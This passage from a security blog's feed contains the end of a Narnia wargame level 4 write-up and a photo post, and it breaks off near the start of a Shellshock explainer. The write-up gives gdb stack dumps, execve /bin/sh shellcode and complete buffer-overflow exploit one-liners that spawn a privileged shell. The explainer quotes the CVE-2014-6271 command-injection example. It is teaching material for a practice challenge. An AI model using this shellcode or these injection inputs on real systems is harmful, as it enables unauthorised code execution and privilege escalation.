&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; r
Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We see that the frame starts at &lt;strong&gt;0xffffd4cc&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/90xw &lt;span class="nv"&gt;$esp&lt;/span&gt;
0xffffd4a0: 0xffffd4cc  0xffffd7be  0x00000021  0xf7ff7d54
0xffffd4b0: 0xf7e2ae38  0x00000000  0x00000026  0xffffffff
0xffffd4c0: 0x00000000  0x00000000  0x00000001  0x41414141
0xffffd4d0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd4e0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd4f0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd500: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd510: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd520: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd530: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd540: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd550: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd560: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd570: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd580: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd590: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5b0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5c0: 0x41414141  0x41414141  0x41414141  0x00000000
0xffffd5d0: 0x08048500  0x00000000  0x00000000  0xf7e404b3
0xffffd5e0: 0x00000002  0xffffd674  0xffffd680  0xf7fcf000
0xffffd5f0: 0x00000000  0xffffd61c  0xffffd680  0x00000000
0xffffd600: 0x0804824c  0xf7fcaff4
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Taking a look at the information of the frame gives us the return address, from which we find the size of the Stack:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; i f
Stack level 0, frame at 0xffffd5e0:
 &lt;span class="nv"&gt;eip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x80484fa in main; saved eip 0xf7e404b3
 Arglist at 0xffffd5d8, args:
 Locals at 0xffffd5d8, Previous frame&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s sp is 0xffffd5e0
 Saved registers:
  ebp at 0xffffd5d8, edi at 0xffffd5d4, eip at 0xffffd5dc
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; p 0xffffd5dc-0xffffd4cc
&lt;span class="nv"&gt;$1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 272
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Step 4: Writing and Applying the Exploit&lt;/h3&gt;
&lt;p&gt;We know that the Stack has size of 272 bytes and that the return address is &lt;strong&gt;0xffffd5dc&lt;/strong&gt;.  If we add the return address, it sums to 276.&lt;/p&gt;
&lt;p&gt;Now we have some freedom to choose where to place our shellcode. Let's say, we place it somewhere in the middle, say, at the position 134. In the memory, we get: &lt;code&gt;0xffffd5cc - 134 = 0xffffd546&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Since 276 minus 134 is 142, if we point the return address to   &lt;strong&gt;0xffffd546&lt;/strong&gt;, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason we fill the addresses around with NOPs.&lt;/p&gt;
&lt;p&gt;We will borrow the shellcode from the previous levels, which has size of 25 bytes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x31&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xc0&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x73&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x62&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x69&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x6e&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe3&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe2&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe1&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xb0&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x0b&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xcd&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x80&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Considering the values above, we can write the following exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;print &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*142 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*105 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x46\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We could have used another address to craft another version of the exploit. Then we would have to simply adjust our NOPs and our paddings. For example, &lt;code&gt;0xffffd5cc - 120 = 0xffffd554&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*156 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x54\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Both works.&lt;/p&gt;
&lt;p&gt;We finally apply our exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia4&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;print &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*156 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x54\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="err"&gt;������������������������������������������������������������������������������������������������������������������������������������������������������������&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;�&lt;/span&gt;&lt;span class="n"&gt;Ph&lt;/span&gt;&lt;span class="c1"&gt;//shh/bin��P��P���&lt;/span&gt;
              &lt;span class="n"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT&lt;/span&gt;&lt;span class="err"&gt;���&lt;/span&gt;
&lt;span class="n"&gt;narnia4&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia4&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;print &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*156 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x54\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;whoami&lt;/span&gt;
&lt;span class="n"&gt;narnia5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;All right, we have completed half of the challenges from Narnia. Soon I will post the other half.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Mon, 06 Oct 2014 06:30:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-06:smashing-the-stack-for-fun-or-wargames-narnia-0-4.html</guid><category>Buffer</category><category>Overflow</category><category>Stack</category><category>NOP</category><category>C</category><category>Assembly</category><category>gdb</category><category>Wargames</category><category>Linux</category></item><item><title>That's What Love Looks Like</title><link>http://bt3gl.github.io/thats-what-love-looks-like.html</link><description>&lt;p&gt;There was so much hate in the internet these last days  that I decided to talk about a day which was about &lt;strong&gt;love&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Correction: I am not actually talking. I'm showing some of my pictures.&lt;/p&gt;
&lt;p&gt;The (legendary) &lt;a href="http://en.wikipedia.org/wiki/People's_Climate_March"&gt;People's Climate March&lt;/a&gt;, which happened a couple of weeks ago in NYC,filled my veins with &lt;strong&gt;hope&lt;/strong&gt;. No words are able to express what each of these pictures say.&lt;/p&gt;
&lt;iframe class="imgur-album" width="100%" height="550" frameborder="0" src="//imgur.com/a/Rcnoo/embed?background=f2f2f2&amp;text=1a1a1a&amp;link=4e76c9"&gt;&lt;/iframe&gt;

&lt;p&gt;The rest of the pictures (and in larger resolution) are &lt;a href="https://flic.kr/s/aHsk4dVkbV"&gt;here (flickr)&lt;/a&gt; or &lt;a href="https://www.behance.net/gallery/20284067/Peoples-Climate-March-NYC-2014"&gt;here (behance)&lt;/a&gt;. Peace.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Mon, 06 Oct 2014 00:50:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-06:thats-what-love-looks-like.html</guid><category>Hope</category><category>Love</category></item><item><title>Understanding the Shellshock Vulnerability</title><link>http://bt3gl.github.io/understanding-the-shellshock-vulnerability.html</link><description>&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/kjkWTWV.png" /&gt;&lt;/p&gt;
&lt;p&gt;Almost a week ago, a new (&lt;a href="http://blog.erratasec.com/2014/09/shellshock-is-20-years-old-get-off-my.html"&gt;old&lt;/a&gt;) type of &lt;a href="http://cwe.mitre.org/data/definitions/78.html"&gt;OS command Injection&lt;/a&gt; was reported. The &lt;strong&gt;Shellshock&lt;/strong&gt; vulnerability, also know as &lt;strong&gt;&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271"&gt;CVE-2014-6271&lt;/a&gt;&lt;/strong&gt;, allows attackers to inject their own code into &lt;a href="http://www.gnu.org/software/bash/"&gt;Bash&lt;/a&gt; using specially crafted &lt;strong&gt;environment variables&lt;/strong&gt;, and it was disclosed with the following description:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="nx"&gt;Bash&lt;/span&gt; &lt;span class="nx"&gt;supports&lt;/span&gt; &lt;span class="nx"&gt;exporting&lt;/span&gt; &lt;span class="nx"&gt;not&lt;/span&gt; &lt;span class="nx"&gt;just&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt; &lt;span class="nx"&gt;variables&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;but&lt;/span&gt; &lt;span class="nx"&gt;also&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt; &lt;span class="nx"&gt;functions&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;other&lt;/span&gt; &lt;span class="nx"&gt;bash&lt;/span&gt; &lt;span class="nx"&gt;instances&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;via&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;process&lt;/span&gt; &lt;span class="nx"&gt;environment&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;indirect&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;child&lt;/span&gt; &lt;span class="nx"&gt;processes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;Current&lt;/span&gt; &lt;span class="nx"&gt;bash&lt;/span&gt; &lt;span class="nx"&gt;versions&lt;/span&gt; &lt;span class="nx"&gt;use&lt;/span&gt; &lt;span class="nx"&gt;an&lt;/span&gt; &lt;span class="nx"&gt;environment&lt;/span&gt; &lt;span class="nx"&gt;variable&lt;/span&gt; &lt;span class="nx"&gt;named&lt;/span&gt; &lt;span class="nx"&gt;by&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;definition&lt;/span&gt; &lt;span class="nx"&gt;starting&lt;/span&gt; &lt;span class="kd"&gt;with&lt;/span&gt; &lt;span class="err"&gt;“&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;”&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;variable&lt;/span&gt; &lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;propagate&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;  &lt;span class="nx"&gt;definitions&lt;/span&gt; &lt;span class="nx"&gt;through&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;environment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;The&lt;/span&gt; &lt;span class="nx"&gt;vulnerability&lt;/span&gt; &lt;span class="nx"&gt;occurs&lt;/span&gt; &lt;span class="nx"&gt;because&lt;/span&gt;  &lt;span class="nx"&gt;bash&lt;/span&gt; &lt;span class="nx"&gt;does&lt;/span&gt; &lt;span class="nx"&gt;not&lt;/span&gt; &lt;span class="nx"&gt;stop&lt;/span&gt; &lt;span class="nx"&gt;after&lt;/span&gt; &lt;span class="nx"&gt;processing&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;definition&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;it&lt;/span&gt; &lt;span class="nx"&gt;continues&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;parse&lt;/span&gt; &lt;span class="nx"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;execute&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt; &lt;span class="nx"&gt;commands&lt;/span&gt; &lt;span class="nx"&gt;following&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;definition&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;

    &lt;span class="nx"&gt;For&lt;/span&gt; &lt;span class="nx"&gt;example&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;an&lt;/span&gt; &lt;span class="nx"&gt;environment&lt;/span&gt; &lt;span class="nx"&gt;variable&lt;/span&gt; &lt;span class="nx"&gt;setting&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt;
                    &lt;span class="nx"&gt;VAR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;ignored&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt; &lt;span class="err"&gt;/bin/id&lt;/span&gt;
    &lt;span class="nx"&gt;will&lt;/span&gt; &lt;span class="nx"&gt;execute&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt; &lt;span class="nx"&gt;when&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;environment&lt;/span&gt; &lt;span class="nx"&gt;is&lt;/span&gt; &lt;span class="nx"&gt;imported&lt;/span&gt; &lt;span class="nx"&gt;into&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;bash&lt;/span&gt; &lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;The&lt;/span&gt; &lt;span class="nx"&gt;process&lt;/span&gt; &lt;span class="nx"&gt;is&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="nx"&gt;slightly&lt;/span&gt; &lt;span class="kc"&gt;undefined&lt;/span&gt; &lt;span class="nx"&gt;state&lt;/span&gt; &lt;span class="nx"&gt;at&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt; &lt;span class="nx"&gt;point&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;The&lt;/span&gt; &lt;span class="nx"&gt;PATH&lt;/span&gt; &lt;span class="nx"&gt;variable&lt;/span&gt; &lt;span class="nx"&gt;may&lt;/span&gt; &lt;span class="nx"&gt;not&lt;/span&gt; &lt;span class="nx"&gt;have&lt;/span&gt; &lt;span class="nx"&gt;been&lt;/span&gt; &lt;span class="nx"&gt;set&lt;/span&gt; &lt;span class="nx"&gt;up&lt;/span&gt; &lt;span class="nx"&gt;yet&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;bash&lt;/span&gt; &lt;span class="nx"&gt;could&lt;/span&gt; &lt;span class="nx"&gt;crash&lt;/span&gt;  &lt;span class="nx"&gt;after&lt;/span&gt; &lt;span class="nx"&gt;executing&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;but&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;damage&lt;/span&gt; &lt;span class="nx"&gt;has&lt;/span&gt; &lt;span class="nx"&gt;already&lt;/span&gt; &lt;span class="nx"&gt;happened&lt;/span&gt; &lt;span class="nx"&gt;at&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;  &lt;span class="nx"&gt;point&lt;/span&gt;&lt;span class="p"&gt;.)&lt;/span&gt;

    &lt;span class="nx"&gt;The&lt;/span&gt; &lt;span class="nx"&gt;fact&lt;/span&gt; &lt;span class="nx"&gt;that&lt;/span&gt; &lt;span class="nx"&gt;an&lt;/span&gt; &lt;span class="nx"&gt;environment&lt;/span&gt; &lt;span class="nx"&gt;variable&lt;/span&gt; &lt;span class="kd"&gt;with&lt;/span&gt; &lt;span class="nx"&gt;an&lt;/span&gt; &lt;span class="nx"&gt;arbitrary&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt; &lt;span class="nx"&gt;can&lt;/span&gt; &lt;span class="nx"&gt;be&lt;/span&gt; &lt;span class="nx"&gt;used&lt;/span&gt; &lt;span class="nx"&gt;as&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="nx"&gt;carrier&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="nx"&gt;malicious&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;definition&lt;/span&gt; &lt;span class="nx"&gt;containing&lt;/span&gt; &lt;span class="nx"&gt;trailing&lt;/span&gt; &lt;span class="nx"&gt;commands&lt;/span&gt; &lt;span class="nx"&gt;makes&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt; &lt;span class="nx"&gt;vulnerability&lt;/span&gt; &lt;span class="nx"&gt;particularly&lt;/span&gt; &lt;span class="nx"&gt;severe&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;it&lt;/span&gt; &lt;span class="nx"&gt;enables&lt;/span&gt; &lt;span class="nx"&gt;network&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;based&lt;/span&gt; &lt;span class="nx"&gt;exploitation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Even more scary, the &lt;a href="http://nvd.nist.gov/"&gt;NIST vulnerability database&lt;/a&gt; has rated &lt;a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271"&gt;this vulnerability “10 out of 10” in terms of severity&lt;/a&gt;. At this point, there are claims that the &lt;a href="http://www.securityweek.com/shellshock-attacks-could-already-top-1-billion-report?utm_source=feedburner&amp;amp;utm_medium=feed&amp;amp;utm_campaign=Feed%3A+Securityweek+%28SecurityWeek+RSS+Feed%29"&gt;Shellshock attacks could already top 1 Billion&lt;/a&gt;. &lt;a href="http://www.alienvault.com/open-threat-exchange/blog/attackers-exploiting-shell-shock-cve-2014-6721-in-the-wild"&gt;Shellshock-targeting DDoS attacks and IRC bots were spotted less than 24 hours after news about Shellshock went public last week!&lt;/a&gt;. Matthew Prince, from &lt;a href="https://www.cloudflare.com/"&gt;Cloudflare&lt;/a&gt;, said yesterday that they are "&lt;a href="https://twitter.com/eastdakota/status/516457250332741632"&gt;seeing north of 1.5 million Shellshock attacks across the CloudFlare network daily&lt;/a&gt;". In the same day, the &lt;a href="http://www.incapsula.com/blog/shellshock-bash-vulnerability-aftermath.html,"&gt;Incapsula&lt;/a&gt; team released several plots showing that their application firewall had deflected over 217,089 exploit attempts on over 4,115 domains. Although almost 70% were scanners (to attempt to verify the vulnerability), almost 35% where either payloads to try to hijack the server or &lt;a href="http://en.wikipedia.org/wiki/Denial-of-service_attack"&gt;DDoS&lt;/a&gt; malware.&lt;/p&gt;
&lt;p&gt;Pretty nasty stuff, huh?&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Understanding the Bash Shell&lt;/h2&gt;
&lt;p&gt;To understand this vulnerability, we need to understand how Bash handles functions and environment variables.&lt;/p&gt;
&lt;p&gt;The &lt;a href="http://www.gnu.org/software/bash/"&gt;GNU Bourne Again shell (BASH)&lt;/a&gt; is a &lt;a href="http://en.wikipedia.org/wiki/Bash_(Unix_shell)"&gt;Unix shell&lt;/a&gt; and &lt;a href="http://en.wikipedia.org/wiki/Command-line_interface"&gt;command language interpreter&lt;/a&gt;. It was released in 1989  by &lt;a href="http://en.wikipedia.org/wiki/Brian_Fox_(computer_programmer)"&gt;Brian Fox&lt;/a&gt; for the &lt;a href="http://www.gnu.org/gnu/thegnuproject.html"&gt;GNU Project&lt;/a&gt; as a free software replacement for the &lt;a href="http://en.wikipedia.org/wiki/Bourne_shell"&gt;Bourne shell&lt;/a&gt; (which was born back in 1977).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;man bash
NAME
       bash - GNU Bourne-Again SHell
SYNOPSIS
       bash &lt;span class="o"&gt;[&lt;/span&gt;options&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;file&lt;span class="o"&gt;]&lt;/span&gt;
COPYRIGHT
       Bash is Copyright &lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt; 1989-2011 by the Free Software Foundation, Inc.
DESCRIPTION
       Bash  is  an sh-compatible &lt;span class="nb"&gt;command &lt;/span&gt;language interpreter that executes commands &lt;span class="nb"&gt;read &lt;/span&gt;from the standard input or from a file.  Bash also incorporates useful features from the Korn and C shells &lt;span class="o"&gt;(&lt;/span&gt;ksh and csh&lt;span class="o"&gt;)&lt;/span&gt;.
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


